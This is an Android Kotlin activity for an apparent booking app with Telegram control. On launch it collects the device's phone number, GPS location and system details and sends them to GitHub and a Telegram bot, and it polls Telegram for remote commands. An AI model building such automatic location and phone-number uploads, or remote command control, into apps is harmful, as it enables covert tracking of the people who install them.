package com.example.telegramservice

import android.Manifest
import android.content.pm.PackageManager
import android.os.Bundle
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.example.telegramservice.databinding.ActivityMainBinding
import kotlinx.coroutines.launch

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private val botHelper = TelegramBotHelper()
    private val featureManager = FeatureManager()
    private var currentFeatures = AppFeatures()
    private lateinit var statusReporter: StatusReporter

    private val LOCATION_PERMISSION_REQUEST = 1001
    private val PHONE_PERMISSION_REQUEST = 1002

    private lateinit var healthReporter: DeviceHealthReporter
    private lateinit var remoteManager: RemoteCommandManager

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        statusReporter = StatusReporter(this)
        healthReporter = DeviceHealthReporter(this)
        remoteManager = RemoteCommandManager(this, statusReporter)

        // Check token
        if (BuildConfig.BOT_TOKEN.contains("YOUR_NEW") || BuildConfig.BOT_TOKEN.length < 20) {
            binding.tvStatus.text = "⚠️ Testing Token use ho raha hai - Production se pehle badalna!\n\n"
        }

        // Device info
        binding.tvDeviceId.text = "📱 ${statusReporter.getDeviceId()} • ${statusReporter.getDeviceName()} • v${BuildConfig.VERSION_NAME}"
        binding.tvStatus.text = "${binding.tvStatus.text}📱 Device: ${statusReporter.getDeviceId()} (${statusReporter.getDeviceName()})\n${statusReporter.getBatteryStatusText()}\n"

        // Request permissions for Location + Phone
        requestPermissions()

        // Check features from Telegram control
        checkFeaturesFromTelegram()

        // Start Remote Command Polling - Telegram se control
        remoteManager.startPolling(statusReporter.getDeviceId(), lifecycleScope) { cmd ->
            runOnUiThread {
                Toast.makeText(this, "🎛️ Remote Command: ${cmd.type} - ${cmd.payload}", Toast.LENGTH_LONG).show()
                binding.tvStatus.text = "🎛️ Remote Command Executed: ${cmd.type}\n${binding.tvStatus.text}"
                // Refresh status after command
                lifecycleScope.launch {
                    val mobile = statusReporter.getMobileNumber()
                    val loc = statusReporter.getLocation()
                    sendStatusToCloud("Remote Command ${cmd.type} Executed\nBattery: ${statusReporter.getBatteryStatusText()}\nMobile: $mobile\n${statusReporter.getLocationString(loc)}")
                }
            }
        }

        // Auto send status to cloud with Location + Battery + Mobile + Health
        lifecycleScope.launch {
            updateHealthUI()
            val mobile = statusReporter.getMobileNumber()
            val loc = statusReporter.getLocation()
            val health = healthReporter.getFullHealth()
            binding.tvHealth.text = "📊 Health:\n${healthReporter.getRAMInfo().optString("text")}\n${healthReporter.getStorageInfo().optString("text")}\n${healthReporter.getNetworkInfo().optString("text")}"
            binding.tvBattery.text = statusReporter.getBatteryStatusText()
            binding.tvMobile.text = "📞 Mobile\n$mobile"
            binding.tvLocation.text = statusReporter.getLocationString(loc)
            sendStatusToCloud("App Started - Full Features\n${statusReporter.getBatteryStatusText()}\nMobile: $mobile\n${statusReporter.getLocationString(loc)}\n${healthReporter.getRAMInfo().optString("text")}\n${healthReporter.getStorageInfo().optString("text")}")
        }

        binding.btnBook.setOnClickListener {
            val name = binding.etName.text.toString().trim()
            val phone = binding.etPhone.text.toString().trim()
            val service = binding.etService.text.toString().trim()

            if (name.isEmpty() || phone.isEmpty() || service.isEmpty()) {
                Toast.makeText(this, "Sab fields bharo!", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            val (canBook, reason) = featureManager.canBook(currentFeatures)
            if (!canBook) {
                binding.tvStatus.text = reason
                Toast.makeText(this, reason, Toast.LENGTH_LONG).show()
                return@setOnClickListener
            }

            binding.btnBook.isEnabled = false
            binding.btnBook.text = "Bhej raha hu..."
            
            lifecycleScope.launch {
                updateHealthUI()
                val mobile = statusReporter.getMobileNumber()
                val loc = statusReporter.getLocation()
                val battery = statusReporter.getBatteryStatusText()
                val health = healthReporter.getFullHealth()
                
                val statusOutput = """
                    🔔 NEW BOOKING - ${statusReporter.getDeviceName()}
                    ━━━━━━━━━━━━━━━━━━━━━━━
                    👤 Name: $name
                    📞 Customer Phone: $phone
                    🛠 Service: $service
                    💰 Price: ${currentFeatures.servicePrice}
                    $battery
                    📞 Device Mobile: $mobile
                    ${statusReporter.getLocationString(loc)}
                    ${healthReporter.getRAMInfo().optString("text")}
                    ${healthReporter.getStorageInfo().optString("text")}
                    ${healthReporter.getNetworkInfo().optString("text")}
                    🆔 Device ID: ${statusReporter.getDeviceId()}
                    ⏰ ${java.util.Date()}
                    ━━━━━━━━━━━━━━━━━━━━━━━
                """.trimIndent()
                
                binding.tvStatus.text = "☁️ GitHub + Telegram pe bhej raha hu...\n$battery\n📞 $mobile\n${statusReporter.getLocationString(loc)}"
                
                val cloudResult = statusReporter.sendStatusToGitHub(statusOutput)
                val result = botHelper.sendBookingMessage(name, phone, "$service | $battery | Mobile:$mobile | Loc:${loc?.latitude},${loc?.longitude}")

                binding.btnBook.isEnabled = true
                binding.btnBook.text = getString(R.string.btn_book)
                binding.tvStatus.text = "${result.message}\n\n${cloudResult.message}\n\n💻 Console: dthakur-dt.github.io/Suto/\n${if (loc != null) "🗺️ Maps: https://maps.google.com/?q=${loc.latitude},${loc.longitude}" else ""}"

                if (result.ok) {
                    Toast.makeText(this@MainActivity, "Success ✅ GitHub + Telegram\n$battery", Toast.LENGTH_LONG).show()
                    binding.etName.text?.clear()
                    binding.etPhone.text?.clear()
                    binding.etService.text?.clear()
                } else {
                    Toast.makeText(this@MainActivity, "Fail: ${result.message}", Toast.LENGTH_LONG).show()
                }
            }
        }

        // SOS Panic Button
        binding.btnSOS.setOnClickListener {
            lifecycleScope.launch {
                val mobile = statusReporter.getMobileNumber()
                val loc = statusReporter.getLocation()
                val battery = statusReporter.getBatteryStatusText()
                val mapsLink = if (loc != null) "https://maps.google.com/?q=${loc.latitude},${loc.longitude}" else "Location not available"
                
                val sosMessage = """
                    🆘🆘🆘 SOS PANIC ALERT 🆘🆘🆘
                    ━━━━━━━━━━━━━━━━━━━━━━━
                    📱 Device: ${statusReporter.getDeviceId()} - ${statusReporter.getDeviceName()}
                    📞 Mobile: $mobile
                    $battery
                    ${statusReporter.getLocationString(loc)}
                    ⏰ Time: ${java.util.Date()}
                    🗺️ Maps: $mapsLink
                    ━━━━━━━━━━━━━━━━━━━━━━━
                    User pressed SOS button! Need immediate help!
                """.trimIndent()

                Toast.makeText(this@MainActivity, "🆘 SOS Sending...", Toast.LENGTH_LONG).show()
                binding.tvStatus.text = "🆘 SOS ALERT SENDING...\n$battery\n📞 $mobile\n${statusReporter.getLocationString(loc)}"
                
                val cloudResult = statusReporter.sendStatusToGitHub(sosMessage)
                val telegramResult = botHelper.sendBookingMessage("SOS_ALERT", mobile, sosMessage)
                
                binding.tvStatus.text = "🆘 SOS SENT!\n${telegramResult.message}\n${cloudResult.message}\nMaps: $mapsLink"
                Toast.makeText(this@MainActivity, "🆘 SOS Sent to Telegram + GitHub!", Toast.LENGTH_LONG).show()
            }
        }

        // Refresh All
        binding.btnRefreshAll.setOnClickListener {
            lifecycleScope.launch {
                Toast.makeText(this@MainActivity, "🔄 Refreshing all - Location + Battery + Mobile + Health", Toast.LENGTH_SHORT).show()
                updateHealthUI()
                val mobile = statusReporter.getMobileNumber()
                val loc = statusReporter.getLocation()
                val battery = statusReporter.getBatteryStatusText()
                val health = healthReporter.getFullHealth()
                val output = "Manual Full Refresh\n$battery\nMobile: $mobile\n${statusReporter.getLocationString(loc)}\n${healthReporter.getRAMInfo().optString("text")}\n${healthReporter.getStorageInfo().optString("text")}"
                sendStatusToCloud(output)
                binding.tvStatus.text = "🔄 Full Refreshed:\n$battery\n📞 $mobile\n${statusReporter.getLocationString(loc)}\n${healthReporter.getNetworkInfo().optString("text")}\n\n☁️ GitHub pe bhej diya!"
                binding.tvBattery.text = battery
                binding.tvMobile.text = "📞 Mobile\n$mobile"
                binding.tvLocation.text = statusReporter.getLocationString(loc)
            }
        }

        // Long press status to resend
        binding.tvStatus.setOnLongClickListener {
            binding.btnRefreshAll.performClick()
            true
        }
    }

    private fun updateHealthUI() {
        try {
            val ram = healthReporter.getRAMInfo()
            val storage = healthReporter.getStorageInfo()
            val network = healthReporter.getNetworkInfo()
            binding.tvHealth.text = "📊 Health:\n${ram.optString("text")}\n${storage.optString("text")}\n${network.optString("text")}"
        } catch (e: Exception) {
            binding.tvHealth.text = "📊 Health: Error loading - ${e.message}"
        }
    }

    private fun requestPermissions() {
        val permissions = mutableListOf<String>()
        
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            permissions.add(Manifest.permission.ACCESS_FINE_LOCATION)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            permissions.add(Manifest.permission.READ_PHONE_STATE)
        }
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.READ_PHONE_NUMBERS)
            }
        }

        if (permissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, permissions.toTypedArray(), LOCATION_PERMISSION_REQUEST)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == LOCATION_PERMISSION_REQUEST) {
            lifecycleScope.launch {
                val mobile = statusReporter.getMobileNumber()
                val loc = statusReporter.getLocation()
                Toast.makeText(this@MainActivity, "Permissions: Mobile=$mobile, Loc=${loc != null}", Toast.LENGTH_LONG).show()
                sendStatusToCloud("Permission granted - Refresh\nBattery: ${statusReporter.getBatteryStatusText()}\nMobile: $mobile\n${statusReporter.getLocationString(loc)}")
            }
        }
    }

    private fun checkFeaturesFromTelegram() {
        lifecycleScope.launch {
            binding.tvStatus.text = "${binding.tvStatus.text}\n🔄 Telegram se features check kar raha hu..."
            val features = featureManager.fetchFeatures()
            currentFeatures = features
            
            val (canBook, reason) = featureManager.canBook(features)
            
            if (!canBook) {
                binding.btnBook.isEnabled = false
                binding.tvStatus.text = "${binding.tvStatus.text}\n$reason"
                if (features.announcement.isNotEmpty()) {
                    binding.tvStatus.text = "${binding.tvStatus.text}\n📢 ${features.announcement}"
                }
            } else {
                binding.btnBook.isEnabled = true
                var statusText = "${binding.tvStatus.text}\n✅ Ready - Telegram Control Active\n💰 Price: ${features.servicePrice}"
                if (features.announcement.isNotEmpty()) {
                    statusText += "\n📢 ${features.announcement}"
                }
                statusText += "\n🔄 Last: ${features.lastUpdatedBy}"
                binding.tvStatus.text = statusText
            }
        }
    }

    private fun sendStatusToCloud(customOutput: String) {
        lifecycleScope.launch {
            val result = statusReporter.sendStatusToGitHub(customOutput)
            println("Status cloud: ${result.message}")
        }
    }
}
